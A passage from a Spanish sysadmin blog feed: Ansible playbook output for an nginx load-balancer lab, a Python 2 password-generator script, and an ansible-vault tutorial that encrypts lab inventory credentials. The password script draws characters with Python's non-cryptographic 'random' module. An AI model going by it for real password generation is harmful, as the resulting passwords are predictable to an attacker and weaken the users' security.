&lt;p&gt;Lanzamos el &lt;em&gt;playbook&lt;/em&gt;, para que nos monte nuestro entorno:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible-playbook -i inventory/ myenv.yml &lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;Install balancer&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;setup&lt;span class="o"&gt;]&lt;/span&gt; *******************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Install nginx&lt;span class="o"&gt;]&lt;/span&gt; ***************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure example virtualhost is not there&lt;span class="o"&gt;]&lt;/span&gt; *************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure nginx is running&lt;span class="o"&gt;]&lt;/span&gt; *****************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;balancer : Put balancer virtualhost&lt;span class="o"&gt;]&lt;/span&gt; *************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;balancer : Reload nginx configuration&lt;span class="o"&gt;]&lt;/span&gt; ***********************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;Install webservers&lt;span class="o"&gt;]&lt;/span&gt; ******************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;setup&lt;span class="o"&gt;]&lt;/span&gt; *******************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Install nginx&lt;span class="o"&gt;]&lt;/span&gt; ***************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure example virtualhost is not there&lt;span class="o"&gt;]&lt;/span&gt; *************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure nginx is running&lt;span class="o"&gt;]&lt;/span&gt; *****************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;web : Put content virtualhost&lt;span class="o"&gt;]&lt;/span&gt; *******************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;web : Put HTML files&lt;span class="o"&gt;]&lt;/span&gt; ****************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;web : Reload nginx configuration&lt;span class="o"&gt;]&lt;/span&gt; ****************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
slave1                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
slave2                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
slave3                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y verificamos que todo funciona como debe:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# for i in `seq 1 8`; do wget -qO- http://slave2:80/; done&lt;/span&gt;
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
~ &lt;span class="c1"&gt;# for i in `seq 1 8`; do wget -qO- http://slave3:80/; done&lt;/span&gt;
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
~ &lt;span class="c1"&gt;# for i in `seq 1 8`; do wget -qO- http://slave1:80/; done&lt;/span&gt;
Hello from web_slave2
Hello from web_slave3
Hello from web_slave2
Hello from web_slave3
Hello from web_slave2
Hello from web_slave3
Hello from web_slave2
Hello from web_slave3
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de cambiar a un entorno con 8 servidores web, podemos usar los roles que tenemos y solamente cambiar &lt;em&gt;myenv.yml&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Fácil, ¿no?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="ansible"></category><category term="playbook"></category><category term="rol"></category></entry><entry><title>Generando passwords complejas con python</title><link href="http://www.linuxsysadmin.ml/2016/08/generando-passwords-complejas-con-python.html" rel="alternate"></link><published>2016-08-22T10:00:00+02:00</published><updated>2016-08-22T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-22:/2016/08/generando-passwords-complejas-con-python.html</id><summary type="html">&lt;p&gt;Todos hemos trabajado en empresas que tienen curiosas políticas de seguridad. La cosa es mas cierta en la generación de &lt;em&gt;passwords&lt;/em&gt;, cuando te piden mayúsculas, minúsculas, dígitos y otros símbolos arcanos. Cuando los administradores tenemos que asignarlas a miles, ya no es divertido y tenemos que generarlas de forma automática …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Todos hemos trabajado en empresas que tienen curiosas políticas de seguridad. La cosa es mas cierta en la generación de &lt;em&gt;passwords&lt;/em&gt;, cuando te piden mayúsculas, minúsculas, dígitos y otros símbolos arcanos. Cuando los administradores tenemos que asignarlas a miles, ya no es divertido y tenemos que generarlas de forma automática.&lt;/p&gt;
&lt;p&gt;Así pues, y harto de hacerlo, hice un &lt;em&gt;script&lt;/em&gt; con &lt;strong&gt;python&lt;/strong&gt; que me asegure que se cumple con todas las restricciones reinantes.&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos que generar &lt;em&gt;passwords&lt;/em&gt; de 12 caracteres, con al menos una mayúscula, una minúscula, un dígito y un otro símbolo.&lt;/p&gt;
&lt;p&gt;El truco es simple: vamos a poner un carácter de cada tipo de los requeridos, y el resto los vamos a poner del alfabeto completo. Luego solo hay que desordenar el conjunto. Para ello, hay algunas cosas que hay que saber en &lt;strong&gt;python&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tenemos métodos para desordenar &lt;em&gt;arrays&lt;/em&gt;, pero no &lt;em&gt;strings&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Disponemos de un método para elegir un elemento de un &lt;em&gt;array&lt;/em&gt; o un carácter de un &lt;em&gt;string&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Podemos juntar un &lt;em&gt;array&lt;/em&gt; en un &lt;em&gt;string&lt;/em&gt;, mediante un separador, posiblemente vacío.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, vamos a declarar el alfabeto como &lt;em&gt;strings&lt;/em&gt;, la &lt;em&gt;password&lt;/em&gt; como un &lt;em&gt;array&lt;/em&gt; de caracteres y finalmente vamos a sacar la &lt;em&gt;password&lt;/em&gt; como un &lt;em&gt;string&lt;/em&gt;, juntando los caracteres sin un separador.&lt;/p&gt;
&lt;p&gt;Crearemos un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;password.py&lt;/em&gt;, con el siguiente contenido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;

&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;

&lt;span class="n"&gt;lowercase&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;abcdefghijklmnopqrstuvwxyz&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;uppercase&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0123456789&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;other&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-+_.,:;()&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;all_chars&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lowercase&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;uppercase&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt;

&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lowercase&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uppercase&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;all_chars&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shuffle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras darle permisos de ejecución, solo nos queda generar &lt;em&gt;passwords&lt;/em&gt; hasta que quedemos satisfechos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ./password.py 
pyLq:4CmfU2+
gerard@sirius:~$ ./password.py 
&lt;span class="o"&gt;(&lt;/span&gt;_vM7ag5mobU
gerard@sirius:~$ ./password.py 
4OKDa+afcEm4
gerard@sirius:~$ ./password.py 
w_.T8QjnB4UD
gerard@sirius:~$ ./password.py 
8VxHFb+.9z5e
gerard@sirius:~$ ./password.py 
vl6bSctxHd+c
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="password"></category><category term="python"></category><category term="seguridad"></category></entry><entry><title>Encriptando datos sensibles con Ansible</title><link href="http://www.linuxsysadmin.ml/2016/08/encriptando-datos-sensibles-con-ansible.html" rel="alternate"></link><published>2016-08-15T10:00:00+02:00</published><updated>2016-08-15T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-15:/2016/08/encriptando-datos-sensibles-con-ansible.html</id><summary type="html">&lt;p&gt;Si usamos &lt;strong&gt;ansible&lt;/strong&gt; para configurar otras máquinas tenemos pleno poder para acceder a otras, sea mediante claves SSH o por accesos remotos normales. En este último caso, conviene aplicar un poco de seguridad para evitar que un posible intruso acceda libremente. Para esto podemos encriptar la información sensible con &lt;strong&gt;ansible-vault …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Si usamos &lt;strong&gt;ansible&lt;/strong&gt; para configurar otras máquinas tenemos pleno poder para acceder a otras, sea mediante claves SSH o por accesos remotos normales. En este último caso, conviene aplicar un poco de seguridad para evitar que un posible intruso acceda libremente. Para esto podemos encriptar la información sensible con &lt;strong&gt;ansible-vault&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Para hacer una demostración simple, vamos a partir de &lt;a href="http://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;un artículo anterior&lt;/a&gt;, por comodidad. En este artículo pusimos todos los datos de conexión a las máquinas controladas en el fichero de inventario &lt;em&gt;hosts&lt;/em&gt;, que hoy vamos a trocear y a encriptar las partes sensibles.&lt;/p&gt;
&lt;p&gt;Partimos de un modelo en el que un &lt;strong&gt;master&lt;/strong&gt; con las herramientas de &lt;strong&gt;ansible&lt;/strong&gt; controla s un grupo de &lt;strong&gt;slaves&lt;/strong&gt;, que solo ofrecen acceso SSH. El uso de &lt;strong&gt;docker&lt;/strong&gt; es opcional, pero muy conveniente por la rapidez en montar el entorno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS               NAMES
c2de340b9dac        master              &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;             &lt;span class="m"&gt;17&lt;/span&gt; seconds ago      Up &lt;span class="m"&gt;16&lt;/span&gt; seconds                           ansible
e6f0d2569207        slave               &lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd -D&amp;quot;&lt;/span&gt;   &lt;span class="m"&gt;17&lt;/span&gt; minutes ago      Up &lt;span class="m"&gt;16&lt;/span&gt; minutes                           slave2
497357df848c        slave               &lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd -D&amp;quot;&lt;/span&gt;   &lt;span class="m"&gt;17&lt;/span&gt; minutes ago      Up &lt;span class="m"&gt;17&lt;/span&gt; minutes                           slave1
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todo el tutorial se va a hacer desde la máquina &lt;strong&gt;master&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Estado inicial&lt;/h2&gt;
&lt;p&gt;Siguiendo el artículo mencionado, disponemos de un fichero de inventario &lt;em&gt;hosts&lt;/em&gt; que declara todos los servidores y grupos que tenemos, conjuntamente con sus datos de conexión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t

&lt;span class="o"&gt;[&lt;/span&gt;slaves&lt;span class="o"&gt;]&lt;/span&gt;
slave1
slave2
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que funciona como debe.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i hosts -m ping slaves&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Separando el inventario en dos partes&lt;/h2&gt;
&lt;p&gt;Como solo queremos encriptar los datos de conexión, vamos a partir el inventario en dos ficheros, dentro de su carpeta. &lt;strong&gt;ansible&lt;/strong&gt; va a recibir esa carpeta como inventario y va a juntar ambas partes para sacar la visión global.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# tree inventory/&lt;/span&gt;
inventory/
├── hosts
└── vault

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es tener una parte visible con los grupos y los servidores que los componen, y otra parte secreta con los datos a ocultar. Así quedaría la partición:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves&lt;span class="o"&gt;]&lt;/span&gt;
slave1
slave2
~ &lt;span class="c1"&gt;# cat inventory/vault &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras indicar a &lt;strong&gt;ansible&lt;/strong&gt; que queremos utilizar esta nueva carpeta como inventario, vemos que sigue funcionando de manera adecuada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Encriptando el fichero secreto&lt;/h2&gt;
&lt;p&gt;Para conseguir esto, se va a utilizar el comando &lt;strong&gt;ansible-vault&lt;/strong&gt;, al que se le pide que encripte el fichero secreto. Es una encriptación simétrica que encripta y desencripta con la misma contraseña.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible-vault encrypt inventory/vault &lt;/span&gt;
New Vault password: 
Confirm New Vault password: 
Encryption successful
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el fichero ha quedado modificado, de forma que ya ni se puede curiosear:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves&lt;span class="o"&gt;]&lt;/span&gt;
slave1
slave2
~ &lt;span class="c1"&gt;# cat inventory/vault &lt;/span&gt;
&lt;span class="nv"&gt;$ANSIBLE_VAULT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt;AES256
&lt;span class="m"&gt;37306639633165383030626335356261333436646539373962623937653137666430366330313663&lt;/span&gt;
3666396533313031633236383964323235376262386337360a303037366336666135363266616363
&lt;span class="m"&gt;63656431623363343639663331613262643032393034623337383134306635313235623463316466&lt;/span&gt;
3161613332306136310a663261346565386634663938656136363939653061373035346332616164
&lt;span class="m"&gt;62353865313265306132366166653263623964306536633163393764306166366236666362323165&lt;/span&gt;
&lt;span class="m"&gt;39353835346263646134383037386465656131356130376165646331623438336336363462383066&lt;/span&gt;
&lt;span class="m"&gt;34353062396364393239333563336466653637343030326262323338313065623864393131343165&lt;/span&gt;
&lt;span class="m"&gt;35313134666566663636636237376563316436666437316632613630396565643539623661323436&lt;/span&gt;
&lt;span class="m"&gt;30383261333230613130666465626137656463326238626163656465316632303638373334623137&lt;/span&gt;
&lt;span class="m"&gt;61653537396535346266623462396165333731326462646534343833346165333034613037663033&lt;/span&gt;
&lt;span class="m"&gt;64613763363635333030393464646139373339333436343861313462666537636461303238326433&lt;/span&gt;
&lt;span class="m"&gt;30346333303336643663623563613465393661626565636630383931643863343430613335373234&lt;/span&gt;
&lt;span class="m"&gt;3336&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando usemos fichero encriptados, &lt;strong&gt;ansible&lt;/strong&gt; es capaz de desencriptarlos según se necesite. Solo hace falta indicarle la forma en la que queremos darle la contraseña, por ejemplo, por el terminal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves --ask-vault-pass&lt;/span&gt;
Vault password: 
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
